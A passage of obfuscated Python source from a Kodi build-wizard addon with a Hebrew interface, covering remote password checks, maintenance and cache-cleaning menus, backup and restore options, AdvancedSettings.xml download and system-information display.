						addFile (OO0OOOO0O0OO0O0OO ,'viewVideo',url =url ,description =O0OOO0O00O0O000OO ,icon =OO0O0OO00OO00OO0O ,fanart =OOOO0O0O00OO000OO ,themeit =THEME2 )#line:2436
			else :wiz .log ("[YouTube Menu] ERROR: Invalid Format.")#line:2437
		else :#line:2438
			wiz .log ("[YouTube Menu] ERROR: URL for YouTube list not working.")#line:2439
			addFile ('Url for txt file not valid','',themeit =THEME3 )#line:2440
			addFile ('%s'%OOOOOOO0OO00OO0O0 ,'',themeit =THEME3 )#line:2441
	else :wiz .log ("[YouTube Menu] No YouTube list added.")#line:2442
	setView ('files','viewType')#line:2443
def STARTP ():#line:2444
	OO0O00O0OO0OO0000 =(ADDON .getSetting ("pass"))#line:2445
	if BUILDNAME =="":#line:2446
	 if not NOTIFY =='true':#line:2447
          OOO000O0000OO00OO =wiz .workingURL (NOTIFICATION )#line:2448
	 if not NOTIFY2 =='true':#line:2449
          OOO000O0000OO00OO =wiz .workingURL (NOTIFICATION2 )#line:2450
	 if not NOTIFY3 =='true':#line:2451
          OOO000O0000OO00OO =wiz .workingURL (NOTIFICATION3 )#line:2452
	O0OOO0O0O0O0OO00O =OO0O00O0OO0OO0000 #line:2453
	OOO000O0000OO00OO =urllib2 .Request (SPEED )#line:2454
	OOOOOO000O0000O00 =urllib2 .urlopen (OOO000O0000OO00OO )#line:2455
	OO0OO0OO0000OO000 =OOOOOO000O0000O00 .readlines ()#line:2457
	O0OO00OO00O00O000 =0 #line:2461
	for OO0OO0OOO0OO0OOO0 in OO0OO0OO0000OO000 :#line:2462
		if OO0OO0OOO0OO0OOO0 .split (' ==')[0 ]==OO0O00O0OO0OO0000 or OO0OO0OOO0OO0OOO0 .split ()[0 ]==OO0O00O0OO0OO0000 :#line:2463
			O0OO00OO00O00O000 =1 #line:2464
			break #line:2465
	if O0OO00OO00O00O000 ==0 :#line:2466
					O00O0OO00OOO0OOO0 =DIALOG .yesno ("%s"%ADDONTITLE ,"[COLOR %s]הסיסמה אינה נכונה,"%(COLOR2 ),"הכנס את הסיסמה כעת[/COLOR]",nolabel ='[B][COLOR white]ביטול[/COLOR][/B]',yeslabel ='[B][COLOR green]אישור[/COLOR][/B]')#line:2467
					if O00O0OO00OOO0OOO0 :#line:2469
						ADDON .openSettings ()#line:2471
						STARTP ()#line:2472
						sys .exit ()#line:2473
					else :#line:2474
						sys .exit ()#line:2475
	return 'ok'#line:2479
def STARTP2 ():#line:2480
	OOO00OO0O0O0OOO00 =(ADDON .getSetting ("user"))#line:2481
	O0O0OOO0OO00OO000 =(UNAME )#line:2483
	OO000OO0O0O0O0OOO =urllib2 .urlopen (O0O0OOO0OO00OO000 )#line:2484
	O0O0OOOO00O0OOO00 =OO000OO0O0O0O0OOO .readlines ()#line:2485
	O0000OO0O000O0OO0 =0 #line:2486
	for O0O000OO00O000000 in O0O0OOOO00O0OOO00 :#line:2489
		if O0O000OO00O000000 .split (' ==')[0 ]==OOO00OO0O0O0OOO00 or O0O000OO00O000000 .split ()[0 ]==OOO00OO0O0O0OOO00 :#line:2490
			O0000OO0O000O0OO0 =1 #line:2491
			break #line:2492
	if O0000OO0O000O0OO0 ==0 :#line:2493
		O0O000O0O000O00O0 =DIALOG .yesno ("%s"%ADDONTITLE ,"[COLOR %s]שם המתשמש שהוכנס אינו נכון,"%(COLOR2 ),"הכנס את שם המשתמש כעת[/COLOR]",nolabel ='[B][COLOR white]ביטול[/COLOR][/B]',yeslabel ='[B][COLOR green]אישור[/COLOR][/B]')#line:2494
		if O0O000O0O000O00O0 :#line:2496
			ADDON .openSettings ()#line:2498
			STARTP2 ()#line:2500
			sys .exit ()#line:2501
		else :#line:2502
			sys .exit ()#line:2503
	return 'ok'#line:2507
def passandpin ():#line:2508
	addFile ('קבל קוד אימות','getpass',name ,'getpass',themeit =THEME1 )#line:2509
	addFile ('הכנס שם משתמש','setuname',name ,'setuname',themeit =THEME1 )#line:2510
	addFile ('הכנס סיסמה','setpass',name ,'setpass',themeit =THEME1 )#line:2511
def passandUsername ():#line:2512
	ADDON .openSettings ()#line:2513
def folderback ():#line:2516
    OOO000O0000O0000O =ADDON .getSetting ("path")#line:2517
    if OOO000O0000O0000O :#line:2518
      OOO000O0000O0000O =xbmcgui .Dialog ().browse (0 ,"בחר תקייה",'files','',False ,False ,HOME )#line:2519
      ADDON .setSetting ("path",OOO000O0000O0000O )#line:2520
def backmyupbuild ():#line:2523
		addFile ('מחק את תיקיית הגיבוי שלי','clearbackup',icon =ICONMAINT ,themeit =THEME3 )#line:2527
		addFile ('[COLOR %s]%s[/COLOR]מיקום גיבוי: '%(COLOR2 ,MYBUILDS ),'folderback','Maintenance',icon =ICONMAINT ,themeit =THEME3 )#line:2528
		addFile ('גיבוי בילד שלם','backupbuild',icon =ICONMAINT ,themeit =THEME3 )#line:2529
		addFile ('גיבוי הגדרות סקין ותפריטים בלבד','backuptheme',icon =ICONMAINT ,themeit =THEME3 )#line:2531
		addFile ('גיבוי הגדרות של הרחבות כולל תפריטים וסיסמאות','backupaddon',icon =ICONMAINT ,themeit =THEME3 )#line:2532
		addFile ('שחזור בילד שלם','restorezip',icon =ICONMAINT ,themeit =THEME3 )#line:2533
		addFile ('שחזור הגדרות','restoreaddon',icon =ICONMAINT ,themeit =THEME3 )#line:2535
def maintMenu (view =None ):#line:2539
	OO000OO00000OOOOO ='[B][COLOR green]ON[/COLOR][/B]';OOOOO0OOOOOOOOO00 ='[B][COLOR red]OFF[/COLOR][/B]'#line:2541
	OOOO0OO0O00000OOO ='true'if AUTOCLEANUP =='true'else 'false'#line:2542
	OOOOO000000000OOO ='true'if AUTOCACHE =='true'else 'false'#line:2543
	O0OOOOO00000OOO0O ='true'if AUTOPACKAGES =='true'else 'false'#line:2544
	OO0O0O00OOOO000OO ='true'if AUTOTHUMBS =='true'else 'false'#line:2545
	O0OOOOO000000OO00 ='true'if SHOWMAINT =='true'else 'false'#line:2546
	O0OOO00O0OO0O00O0 ='true'if INCLUDEVIDEO =='true'else 'false'#line:2547
	O00O0OO000000OO0O ='true'if INCLUDEALL =='true'else 'false'#line:2548
	OO0OO0OO0OOOOO000 ='true'if THIRDPARTY =='true'else 'false'#line:2549
	if wiz .Grab_Log (True )==False :O00000OOO0000OO00 =0 #line:2550
	else :O00000OOO0000OO00 =errorChecking (wiz .Grab_Log (True ),True ,True )#line:2551
	if wiz .Grab_Log (True ,True )==False :OO000000OOOOOOOO0 =0 #line:2552
	else :OO000000OOOOOOOO0 =errorChecking (wiz .Grab_Log (True ,True ),True ,True )#line:2553
	OOO00O00000OOO000 =int (O00000OOO0000OO00 )+int (OO000000OOOOOOOO0 )#line:2554
	O0OOO00O0OOO0OOOO =str (OOO00O00000OOO000 )+' Error(s) Found'if OOO00O00000OOO000 >0 else 'None Found'#line:2555
	O0OOOO00000000000 =': [COLOR red]Not Found[/COLOR]'if not os .path .exists (WIZLOG )else ": [COLOR green]%s[/COLOR]"%wiz .convertSize (os .path .getsize (WIZLOG ))#line:2556
	if O00O0OO000000OO0O =='true':#line:2557
		O00OO000O0O00OOO0 ='true'#line:2558
		O00OOO0O0OO00000O ='true'#line:2559
		OOO0OOO0O00O00000 ='true'#line:2560
		OOO00OOO0O0OO0000 ='true'#line:2561
		O000O0OOO000000OO ='true'#line:2562
		O00OO000OOO0OO0OO ='true'#line:2563
		O000OOOOO000OO000 ='true'#line:2564
		O00O000OOO0000OO0 ='true'#line:2565
	else :#line:2566
		O00OO000O0O00OOO0 ='true'if INCLUDEBOB =='true'else 'false'#line:2567
		O00OOO0O0OO00000O ='true'if INCLUDEPHOENIX =='true'else 'false'#line:2568
		OOO0OOO0O00O00000 ='true'if INCLUDESPECTO =='true'else 'false'#line:2569
		OOO00OOO0O0OO0000 ='true'if INCLUDEGENESIS =='true'else 'false'#line:2570
		O000O0OOO000000OO ='true'if INCLUDEEXODUS =='true'else 'false'#line:2571
		O00OO000OOO0OO0OO ='true'if INCLUDEONECHAN =='true'else 'false'#line:2572
		O000OOOOO000OO000 ='true'if INCLUDESALTS =='true'else 'false'#line:2573
		O00O000OOO0000OO0 ='true'if INCLUDESALTSHD =='true'else 'false'#line:2574
	OOO0O0OOO00OOOO0O =wiz .getSize (PACKAGES )#line:2575
	O0O0OO00O000O00O0 =wiz .getSize (THUMBS )#line:2576
	O0OO00OO00O000O0O =wiz .getCacheSize ()#line:2577
	O0OOO000O0O0000OO =OOO0O0OOO00OOOO0O +O0O0OO00O000O00O0 +O0OO00OO00O000O0O #line:2578
	OO0O0000O000000OO =['Daily','Always','3 Days','Weekly']#line:2579
	addDir ('[B]Cleaning Tools[/B]','maint','clean',icon =ICONMAINT ,themeit =THEME1 )#line:2580
	if view =="clean"or SHOWMAINT =='true':#line:2581
		addFile ('ניקוי מלא: [COLOR green][B]%s[/B][/COLOR]'%wiz .convertSize (O0OOO000O0O0000OO ),'fullclean',icon =ICONMAINT ,themeit =THEME3 )#line:2582
		addFile ('ניקוי קאש: [COLOR green][B]%s[/B][/COLOR]'%wiz .convertSize (O0OO00OO00O000O0O ),'clearcache',icon =ICONMAINT ,themeit =THEME3 )#line:2583
		addFile ('ניקוי חבילות: [COLOR green][B]%s[/B][/COLOR]'%wiz .convertSize (OOO0O0OOO00OOOO0O ),'clearpackages',icon =ICONMAINT ,themeit =THEME3 )#line:2584
		addFile ('ניקוי תמונות: [COLOR green][B]%s[/B][/COLOR]'%wiz .convertSize (O0O0OO00O000O00O0 ),'clearthumb',icon =ICONMAINT ,themeit =THEME3 )#line:2585
		addFile ('ניקוי תמונות ישנות','oldThumbs',icon =ICONMAINT ,themeit =THEME3 )#line:2586
		addFile ('ניקוי קאש לוג','clearcrash',icon =ICONMAINT ,themeit =THEME3 )#line:2587
		addFile ('ניקוי חבילות ישנות','purgedb',icon =ICONMAINT ,themeit =THEME3 )#line:2588
		addFile ('התקנה נקיה','freshstart',icon =ICONMAINT ,themeit =THEME3 )#line:2589
	addDir ('[B]Addon Tools[/B]','maint','addon',icon =ICONMAINT ,themeit =THEME1 )#line:2590
	if view =="addon"or SHOWMAINT =='false':#line:2591
		addFile ('הסרת הרחבות','removeaddons',icon =ICONMAINT ,themeit =THEME3 )#line:2592
		addDir ('הסרת מידע הרחבות','removeaddondata',icon =ICONMAINT ,themeit =THEME3 )#line:2593
		addDir ('הפעלה או ביטול הרחבות','enableaddons',icon =ICONMAINT ,themeit =THEME3 )#line:2594
		addFile ('Enable/Disable Adult Addons','toggleadult',icon =ICONMAINT ,themeit =THEME3 )#line:2595
		addFile ('בודק עדכונים','forceupdate',icon =ICONMAINT ,themeit =THEME3 )#line:2596
		addFile ('Hide Passwords On Keyboard Entry','hidepassword',icon =ICONMAINT ,themeit =THEME3 )#line:2597
		addFile ('Unhide Passwords On Keyboard Entry','unhidepassword',icon =ICONMAINT ,themeit =THEME3 )#line:2598
	addDir ('[B]Misc Maintenance[/B]','maint','misc',icon =ICONMAINT ,themeit =THEME1 )#line:2599
	if view =="misc"or SHOWMAINT =='true':#line:2600
		addFile ('Kodi 17 Fix','kodi17fix',icon =ICONMAINT ,themeit =THEME3 )#line:2601
		addFile ('Reload Skin','forceskin',icon =ICONMAINT ,themeit =THEME3 )#line:2602
		addFile ('Reload Profile','forceprofile',icon =ICONMAINT ,themeit =THEME3 )#line:2603
		addFile ('Force Close Kodi','forceclose',icon =ICONMAINT ,themeit =THEME3 )#line:2604
		addFile ('Upload Kodi.log','uploadlog',icon =ICONMAINT ,themeit =THEME3 )#line:2605
		addFile ('View Errors in Log: %s'%(O0OOO00O0OOO0OOOO ),'viewerrorlog',icon =ICONMAINT ,themeit =THEME3 )#line:2606
		addFile ('View Log File','viewlog',icon =ICONMAINT ,themeit =THEME3 )#line:2607
		addFile ('View Wizard Log File','viewwizlog',icon =ICONMAINT ,themeit =THEME3 )#line:2608
		addFile ('Clear Wizard Log File%s'%O0OOOO00000000000 ,'clearwizlog',icon =ICONMAINT ,themeit =THEME3 )#line:2609
	addDir ('[B]שחזור וגיבוי[/B]','maint','backup',icon =ICONMAINT ,themeit =THEME1 )#line:2610
	if view =="backup"or SHOWMAINT =='true':#line:2611
		addFile ('Clean Up Back Up Folder','clearbackup',icon =ICONMAINT ,themeit =THEME3 )#line:2612
		addFile ('Back Up Location: [COLOR %s]%s[/COLOR]'%(COLOR2 ,MYBUILDS ),'settings','Maintenance',icon =ICONMAINT ,themeit =THEME3 )#line:2613
		addFile ('[גיבוי]: בילד','backupbuild',icon =ICONMAINT ,themeit =THEME3 )#line:2614
		addFile ('[גיבוי]: פרופילים','backupgui',icon =ICONMAINT ,themeit =THEME3 )#line:2615
		addFile ('[גיבוי]: סקינים','backuptheme',icon =ICONMAINT ,themeit =THEME3 )#line:2616
		addFile ('[גיבוי]: אדון דאטה','backupaddon',icon =ICONMAINT ,themeit =THEME3 )#line:2617
		addFile ('[שחזור]: בילד מתיקיה מקומית','restorezip',icon =ICONMAINT ,themeit =THEME3 )#line:2618
		addFile ('[שחזור]: פרופילים מתיקיה מקומית','restoregui',icon =ICONMAINT ,themeit =THEME3 )#line:2619
		addFile ('[שחזור]: אדון דאטה מתיקיה מקומית','restoreaddon',icon =ICONMAINT ,themeit =THEME3 )#line:2620
		addFile ('[שחזור]: בילד מתיקיה חיצונית','restoreextzip',icon =ICONMAINT ,themeit =THEME3 )#line:2621
		addFile ('[שחזור]: פרופילים מתיקיה חיצונית','restoreextgui',icon =ICONMAINT ,themeit =THEME3 )#line:2622
		addFile ('[שחזור]: אדון דאטה מתיקיה חיצונית','restoreextaddon',icon =ICONMAINT ,themeit =THEME3 )#line:2623
	addDir ('[B]System Tweaks/Fixes[/B]','maint','tweaks',icon =ICONMAINT ,themeit =THEME1 )#line:2624
	if view =="tweaks"or SHOWMAINT =='true':#line:2625
		if not ADVANCEDFILE =='http://'and not ADVANCEDFILE =='':#line:2626
			addDir ('Advanced Settings','advancedsetting',icon =ICONMAINT ,themeit =THEME3 )#line:2627
		else :#line:2628
			if os .path .exists (ADVANCED ):#line:2629
				addFile ('View Currect AdvancedSettings.xml','currentsettings',icon =ICONMAINT ,themeit =THEME3 )#line:2630
				addFile ('Remove Currect AdvancedSettings.xml','removeadvanced',icon =ICONMAINT ,themeit =THEME3 )#line:2631
			addFile ('Quick Configure AdvancedSettings.xml','autoadvanced',icon =ICONMAINT ,themeit =THEME3 )#line:2632
		addFile ('Scan Sources for broken links','checksources',icon =ICONMAINT ,themeit =THEME3 )#line:2633
		addFile ('Scan For Broken Repositories','checkrepos',icon =ICONMAINT ,themeit =THEME3 )#line:2634
		addFile ('Fix Addons Not Updating','fixaddonupdate',icon =ICONMAINT ,themeit =THEME3 )#line:2635
		addFile ('Remove Non-Ascii filenames','asciicheck',icon =ICONMAINT ,themeit =THEME3 )#line:2636
		addFile ('Convert Paths to special','convertpath',icon =ICONMAINT ,themeit =THEME3 )#line:2637
		addDir ('System Information','systeminfo',icon =ICONMAINT ,themeit =THEME3 )#line:2638
	addFile ('Show All Maintenance: %s'%O0OOOOO000000OO00 .replace ('true',OO000OO00000OOOOO ).replace ('false',OOOOO0OOOOOOOOO00 ),'togglesetting','showmaint',icon =ICONMAINT ,themeit =THEME2 )#line:2639
	addDir ('[I]<< Return to Main Menu[/I]',icon =ICONMAINT ,themeit =THEME2 )#line:2640
	addFile ('Third Party Wizards: %s'%OO0OO0OO0OOOOO000 .replace ('true',OO000OO00000OOOOO ).replace ('false',OOOOO0OOOOOOOOO00 ),'togglesetting','enable3rd',fanart =FANART ,icon =ICONMAINT ,themeit =THEME1 )#line:2641
	if OO0OO0OO0OOOOO000 =='true':#line:2642
		OO0OO0O0OOOO0O000 =THIRD1NAME if not THIRD1NAME ==''else 'Not Set'#line:2643
		OOO00O0000OO0O0O0 =THIRD2NAME if not THIRD2NAME ==''else 'Not Set'#line:2644
		O00OOOOO0000O0O0O =THIRD3NAME if not THIRD3NAME ==''else 'Not Set'#line:2645
		addFile ('Edit Third Party Wizard 1: [COLOR %s]%s[/COLOR]'%(COLOR2 ,OO0OO0O0OOOO0O000 ),'editthird','1',icon =ICONMAINT ,themeit =THEME3 )#line:2646
		addFile ('Edit Third Party Wizard 2: [COLOR %s]%s[/COLOR]'%(COLOR2 ,OOO00O0000OO0O0O0 ),'editthird','2',icon =ICONMAINT ,themeit =THEME3 )#line:2647
		addFile ('Edit Third Party Wizard 3: [COLOR %s]%s[/COLOR]'%(COLOR2 ,O00OOOOO0000O0O0O ),'editthird','3',icon =ICONMAINT ,themeit =THEME3 )#line:2648
	addFile ('ניקוי אוטומטי','',fanart =FANART ,icon =ICONMAINT ,themeit =THEME1 )#line:2649
	addFile ('ניקוי אוטומטי בהפעלה: %s'%OOOO0OO0O00000OOO .replace ('true',OO000OO00000OOOOO ).replace ('false',OOOOO0OOOOOOOOO00 ),'togglesetting','autoclean',icon =ICONMAINT ,themeit =THEME3 )#line:2650
	if OOOO0OO0O00000OOO =='true':#line:2651
		addFile ('--- תדירות ניקוי: [B][COLOR green]%s[/COLOR][/B]'%OO0O0000O000000OO [AUTOFEQ ],'changefeq',icon =ICONMAINT ,themeit =THEME3 )#line:2652
		addFile ('--- ניקוי קאש בהפעלה: %s'%OOOOO000000000OOO .replace ('true',OO000OO00000OOOOO ).replace ('false',OOOOO0OOOOOOOOO00 ),'togglesetting','clearcache',icon =ICONMAINT ,themeit =THEME3 )#line:2653
		addFile ('--- ניקוי חבילות בהפעלה: %s'%O0OOOOO00000OOO0O .replace ('true',OO000OO00000OOOOO ).replace ('false',OOOOO0OOOOOOOOO00 ),'togglesetting','clearpackages',icon =ICONMAINT ,themeit =THEME3 )#line:2654
		addFile ('--- ניקוי תמונות ישנות בהפעלה: %s'%OO0O0O00OOOO000OO .replace ('true',OO000OO00000OOOOO ).replace ('false',OOOOO0OOOOOOOOO00 ),'togglesetting','clearthumbs',icon =ICONMAINT ,themeit =THEME3 )#line:2655
	addFile ('ניקוי וידאו קאש','',fanart =FANART ,icon =ICONMAINT ,themeit =THEME1 )#line:2656
	addFile ('Include Video Cache in Clear Cache: %s'%O0OOO00O0OO0O00O0 .replace ('true',OO000OO00000OOOOO ).replace ('false',OOOOO0OOOOOOOOO00 ),'togglecache','includevideo',icon =ICONMAINT ,themeit =THEME3 )#line:2657
	if O0OOO00O0OO0O00O0 =='true':#line:2658
		addFile ('--- Include All Video Addons: %s'%O00O0OO000000OO0O .replace ('true',OO000OO00000OOOOO ).replace ('false',OOOOO0OOOOOOOOO00 ),'togglecache','includeall',icon =ICONMAINT ,themeit =THEME3 )#line:2659
		addFile ('--- Include Bob: %s'%O00OO000O0O00OOO0 .replace ('true',OO000OO00000OOOOO ).replace ('false',OOOOO0OOOOOOOOO00 ),'togglecache','includebob',icon =ICONMAINT ,themeit =THEME3 )#line:2660
		addFile ('--- Include Phoenix: %s'%O00OOO0O0OO00000O .replace ('true',OO000OO00000OOOOO ).replace ('false',OOOOO0OOOOOOOOO00 ),'togglecache','includephoenix',icon =ICONMAINT ,themeit =THEME3 )#line:2661
		addFile ('--- Include Specto: %s'%OOO0OOO0O00O00000 .replace ('true',OO000OO00000OOOOO ).replace ('false',OOOOO0OOOOOOOOO00 ),'togglecache','includespecto',icon =ICONMAINT ,themeit =THEME3 )#line:2662
		addFile ('--- Include Exodus: %s'%O000O0OOO000000OO .replace ('true',OO000OO00000OOOOO ).replace ('false',OOOOO0OOOOOOOOO00 ),'togglecache','includeexodus',icon =ICONMAINT ,themeit =THEME3 )#line:2663
		addFile ('--- Include Salts: %s'%O000OOOOO000OO000 .replace ('true',OO000OO00000OOOOO ).replace ('false',OOOOO0OOOOOOOOO00 ),'togglecache','includesalts',icon =ICONMAINT ,themeit =THEME3 )#line:2664
		addFile ('--- Include Salts HD Lite: %s'%O00O000OOO0000OO0 .replace ('true',OO000OO00000OOOOO ).replace ('false',OOOOO0OOOOOOOOO00 ),'togglecache','includesaltslite',icon =ICONMAINT ,themeit =THEME3 )#line:2665
		addFile ('--- Include One Channel: %s'%O00OO000OOO0OO0OO .replace ('true',OO000OO00000OOOOO ).replace ('false',OOOOO0OOOOOOOOO00 ),'togglecache','includeonechan',icon =ICONMAINT ,themeit =THEME3 )#line:2666
		addFile ('--- Include Genesis: %s'%OOO00OOO0O0OO0000 .replace ('true',OO000OO00000OOOOO ).replace ('false',OOOOO0OOOOOOOOO00 ),'togglecache','includegenesis',icon =ICONMAINT ,themeit =THEME3 )#line:2667
		addFile ('--- Enable All Video Addons','togglecache','true',icon =ICONMAINT ,themeit =THEME3 )#line:2668
		addFile ('--- Disable All Video Addons','togglecache','false',icon =ICONMAINT ,themeit =THEME3 )#line:2669
	setView ('files','viewType')#line:2670
def advancedWindow (url =None ):#line:2672
	if not ADVANCEDFILE =='http://':#line:2673
		if url ==None :#line:2674
			OO0O0O00O000OOO00 =wiz .workingURL (ADVANCEDFILE )#line:2675
			O0O0O0OO00O00O0OO =uservar .ADVANCEDFILE #line:2676
		else :#line:2677
			OO0O0O00O000OOO00 =wiz .workingURL (url )#line:2678
			O0O0O0OO00O00O0OO =url #line:2679
		addFile ('Quick Configure AdvancedSettings.xml','autoadvanced',icon =ICONMAINT ,themeit =THEME3 )#line:2680
		if os .path .exists (ADVANCED ):#line:2681
			addFile ('View Currect AdvancedSettings.xml','currentsettings',icon =ICONMAINT ,themeit =THEME3 )#line:2682
			addFile ('Remove Currect AdvancedSettings.xml','removeadvanced',icon =ICONMAINT ,themeit =THEME3 )#line:2683
		if OO0O0O00O000OOO00 ==True :#line:2684
			if HIDESPACERS =='No':addFile (wiz .sep (),'',icon =ICONMAINT ,themeit =THEME3 )#line:2685
			OO00OO00O00OO0O00 =wiz .openURL (O0O0O0OO00O00O0OO ).replace ('\n','').replace ('\r','').replace ('\t','')#line:2686
			O0000OOOOOO00OOO0 =re .compile ('name="(.+?)".+?ection="(.+?)".+?rl="(.+?)".+?con="(.+?)".+?anart="(.+?)".+?escription="(.+?)"').findall (OO00OO00O00OO0O00 )#line:2687
			if len (O0000OOOOOO00OOO0 )>0 :#line:2688
				for O000OO000OO00OOOO ,OO0O0000O0O00O0OO ,url ,O000O0O0OOO000OO0 ,O0O0O00O000O0OOOO ,OO00O0OO00O0OOOO0 in O0000OOOOOO00OOO0 :#line:2689
					if OO0O0000O0O00O0OO .lower ()=="yes":#line:2690
						addDir ("[B]%s[/B]"%O000OO000OO00OOOO ,'advancedsetting',url ,description =OO00O0OO00O0OOOO0 ,icon =O000O0O0OOO000OO0 ,fanart =O0O0O00O000O0OOOO ,themeit =THEME3 )#line:2691
					else :#line:2692
						addFile (O000OO000OO00OOOO ,'writeadvanced',O000OO000OO00OOOO ,url ,description =OO00O0OO00O0OOOO0 ,icon =O000O0O0OOO000OO0 ,fanart =O0O0O00O000O0OOOO ,themeit =THEME2 )#line:2693
			else :wiz .log ("[Advanced Settings] ERROR: Invalid Format.")#line:2694
		else :wiz .log ("[Advanced Settings] URL not working: %s"%OO0O0O00O000OOO00 )#line:2695
	else :wiz .log ("[Advanced Settings] not Enabled")#line:2696
def writeAdvanced (OO0O00O0O00O00OO0 ,O0O000O00O000OOO0 ):#line:2698
	O00OO00O000OO00OO =wiz .workingURL (O0O000O00O000OOO0 )#line:2699
	if O00OO00O000OO00OO ==True :#line:2700
		if os .path .exists (ADVANCED ):OOOOOOOO00000000O =DIALOG .yesno (ADDONTITLE ,"[COLOR %s]Would you like to overwrite your current Advanced Settings with [COLOR %s]%s[/COLOR]?[/COLOR]"%(COLOR2 ,COLOR1 ,OO0O00O0O00O00OO0 ),yeslabel ="[B][COLOR green]Overwrite[/COLOR][/B]",nolabel ="[B][COLOR red]Cancel[/COLOR][/B]")#line:2701
		else :OOOOOOOO00000000O =DIALOG .yesno (ADDONTITLE ,"[COLOR %s]האם תרצה להוריד ולהתקין [COLOR %s]%s[/COLOR]?[/COLOR]"%(COLOR2 ,COLOR1 ,OO0O00O0O00O00OO0 ),yeslabel ="[B][COLOR green]התקנה[/COLOR][/B]",nolabel ="[B][COLOR red]ביטול[/COLOR][/B]")#line:2702
		if OOOOOOOO00000000O ==1 :#line:2704
			O0000OO000OO00O00 =wiz .openURL (O0O000O00O000OOO0 )#line:2705
			O0O0000000OO00O00 =open (ADVANCED ,'w');#line:2706
			O0O0000000OO00O00 .write (O0000OO000OO00O00 )#line:2707
			O0O0000000OO00O00 .close ()#line:2708
			DIALOG .ok (ADDONTITLE ,'[COLOR %s]AdvancedSettings.xml file has been successfully written.  Once you click okay it will force close kodi.[/COLOR]'%COLOR2 )#line:2709
			wiz .killxbmc (True )#line:2710
		else :wiz .log ("[Advanced Settings] install canceled");wiz .LogNotify ('[COLOR %s]%s[/COLOR]'%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Write Cancelled![/COLOR]"%COLOR2 );return #line:2711
	else :wiz .log ("[Advanced Settings] URL not working: %s"%O00OO00O000OO00OO );wiz .LogNotify ('[COLOR %s]%s[/COLOR]'%(COLOR1 ,ADDONTITLE ),"[COLOR %s]URL Not Working[/COLOR]"%COLOR2 )#line:2712
def viewAdvanced ():#line:2714
	OO000OO0OOO0000O0 =open (ADVANCED )#line:2715
	O000O0000O0OOO0OO =OO000OO0OOO0000O0 .read ().replace ('\t','    ')#line:2716
	wiz .TextBox (ADDONTITLE ,O000O0000O0OOO0OO )#line:2717
	OO000OO0OOO0000O0 .close ()#line:2718
def removeAdvanced ():#line:2720
	if os .path .exists (ADVANCED ):#line:2721
		wiz .removeFile (ADVANCED )#line:2722
	else :LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]AdvancedSettings.xml not found[/COLOR]")#line:2723
def showAutoAdvanced ():#line:2725
	notify .autoConfig ()#line:2726
def getIP ():#line:2728
	OOO00OO0OO0O00O0O ='http://whatismyipaddress.com/'#line:2729
	if not wiz .workingURL (OOO00OO0OO0O00O0O ):return 'Unknown','Unknown','Unknown'#line:2730
	OOO0000OO000OOO00 =wiz .openURL (OOO00OO0OO0O00O0O ).replace ('\n','').replace ('\r','')#line:2731
	if not 'Access Denied'in OOO0000OO000OOO00 :#line:2732
		O0O0OOO0O00O00O0O =re .compile ('whatismyipaddress.com/ip/(.+?)"').findall (OOO0000OO000OOO00 )#line:2733
		OOO0OO0O0000OOOO0 =O0O0OOO0O00O00O0O [0 ]if (len (O0O0OOO0O00O00O0O )>0 )else 'Unknown'#line:2734
		OO0OOOOOOO000000O =re .compile ('"font-size:14px;">(.+?)</td>').findall (OOO0000OO000OOO00 )#line:2735
		OO0OOOO000OO000O0 =OO0OOOOOOO000000O [0 ]if (len (OO0OOOOOOO000000O )>0 )else 'Unknown'#line:2736
		O0O0O0OO0O0O0O00O =OO0OOOOOOO000000O [1 ]+', '+OO0OOOOOOO000000O [2 ]+', '+OO0OOOOOOO000000O [3 ]if (len (OO0OOOOOOO000000O )>2 )else 'Unknown'#line:2737
		return OOO0OO0O0000OOOO0 ,OO0OOOO000OO000O0 ,O0O0O0OO0O0O0O00O #line:2738
	else :return 'Unknown','Unknown','Unknown'#line:2739
def systemInfo ():#line:2741
	OO00OOOOOOO0OOO00 =['System.FriendlyName','System.BuildVersion','System.CpuUsage','System.ScreenMode','Network.IPAddress','Network.MacAddress','System.Uptime','System.TotalUptime','System.FreeSpace','System.UsedSpace','System.TotalSpace','System.Memory(free)','System.Memory(used)','System.Memory(total)']#line:2755
	O0O000O00000OO0O0 =[];O000000O0OO0OOO0O =0 #line:2756
	for OO0O00O0O0O0OOO00 in OO00OOOOOOO0OOO00 :#line:2757
		O0O0OO0O0OO0OO000 =wiz .getInfo (OO0O00O0O0O0OOO00 )#line:2758
		OO000O0OO0O000000 =0 #line:2759
		while O0O0OO0O0OO0OO000 =="Busy"and OO000O0OO0O000000 <10 :#line:2760
			O0O0OO0O0OO0OO000 =wiz .getInfo (OO0O00O0O0O0OOO00 );OO000O0OO0O000000 +=1 ;wiz .log ("%s sleep %s"%(OO0O00O0O0O0OOO00 ,str (OO000O0OO0O000000 )));xbmc .sleep (1000 )#line:2761
		O0O000O00000OO0O0 .append (O0O0OO0O0OO0OO000 )#line:2762
		O000000O0OO0OOO0O +=1 #line:2763
	O0O00OOO0OOOO000O =O0O000O00000OO0O0 [8 ]if 'Una'in O0O000O00000OO0O0 [8 ]else wiz .convertSize (int (float (O0O000O00000OO0O0 [8 ][:-8 ]))*1024 *1024 )#line:2764
	O0OO000O00OOO000O =O0O000O00000OO0O0 [9 ]if 'Una'in O0O000O00000OO0O0 [9 ]else wiz .convertSize (int (float (O0O000O00000OO0O0 [9 ][:-8 ]))*1024 *1024 )#line:2765
	OOOO0000OO00OO0O0 =O0O000O00000OO0O0 [10 ]if 'Una'in O0O000O00000OO0O0 [10 ]else wiz .convertSize (int (float (O0O000O00000OO0O0 [10 ][:-8 ]))*1024 *1024 )#line:2766
	O0OO0OO0O00O0OO00 =wiz .convertSize (int (float (O0O000O00000OO0O0 [11 ][:-2 ]))*1024 *1024 )#line:2767
	O0OO0O0OO0OOO0OOO =wiz .convertSize (int (float (O0O000O00000OO0O0 [12 ][:-2 ]))*1024 *1024 )#line:2768
	O000O0O00O00000OO =wiz .convertSize (int (float (O0O000O00000OO0O0 [13 ][:-2 ]))*1024 *1024 )#line:2769
	O0OOO0O0O0O0000OO ,OO0OOOOOOOOOOO000 ,OOOOO0OOOO0O0O0O0 =getIP ()#line:2770
	OOO000000OOO0OO0O =[];O0O00O00OO0O000O0 =[];O0000O0O0O0000O0O =[];OOO000000OO0000OO =[];OOOOOOOOO0O00O00O =[];OO00OOO0OOO0OOOO0 =[];O00OO0O0O0OO0OOO0 =[]#line:2772
	OO0OO000OO000OO0O =glob .glob (os .path .join (ADDONS ,'*/'))#line:2774
